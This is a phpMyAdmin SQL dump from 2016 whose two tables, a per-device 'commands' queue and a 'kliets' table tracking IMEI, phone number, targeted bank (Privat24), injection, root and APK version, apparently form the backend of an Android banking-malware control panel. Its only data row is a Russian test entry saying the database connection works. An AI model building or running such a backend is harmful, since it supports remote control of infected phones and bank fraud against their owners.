-- phpMyAdmin SQL Dump
-- version 4.4.15.2
-- http://www.phpmyadmin.net
--
-- Host: 10.0.2.9
-- Generation Time: Dec 21, 2016 at 09:58 AM
-- Server version: 5.6.32-78.0-log
-- PHP Version: 5.4.45

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `a184084_5`
--

-- --------------------------------------------------------

--
-- Table structure for table `commands`
--

CREATE TABLE IF NOT EXISTS `commands` (
  `id` int(255) unsigned NOT NULL,
  `IMEI` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `kliets`
--

CREATE TABLE IF NOT EXISTS `kliets` (
  `id` int(255) unsigned NOT NULL,
  `IMEI` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) NOT NULL,
  `country` varchar(30) DEFAULT NULL,
  `bank` varchar(30) DEFAULT NULL,
  `model` varchar(50) DEFAULT NULL,
  `lastConnect` varchar(30) NOT NULL,
  `firstConnect` varchar(30) NOT NULL,
  `inj` varchar(2) DEFAULT NULL,
  `l_bank` varchar(2) DEFAULT NULL,
  `log` varchar(2) DEFAULT NULL,
  `r00t` varchar(10) DEFAULT NULL,
  `screen` varchar(10) DEFAULT NULL,
  `version_apk` varchar(20) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=63 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `kliets`
--

INSERT INTO `kliets` (`id`, `IMEI`, `number`, `version`, `country`, `bank`, `model`, `lastConnect`, `firstConnect`, `inj`, `l_bank`, `log`, `r00t`, `screen`, `version_apk`) VALUES
(61, '9527342340 Если вы это видите', 'Подключение к БД есть!', '6.0', 'ru', '|Privat24|', '4022 (and)', '2016-12-21 09:55', '2016-12-21 09:13', '0', '0', '0', '0', '0', 'Demo\0');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `commands`
--
ALTER TABLE `commands`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`);

--
-- Indexes for table `kliets`
--
ALTER TABLE `kliets`
  ADD PRIMARY KEY (`id`),
  ADD KEY `id` (`id`),
  ADD KEY `id_2` (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `commands`
--
ALTER TABLE `commands`
  MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=37;
--
-- AUTO_INCREMENT for table `kliets`
--
ALTER TABLE `kliets`
  MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=63;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
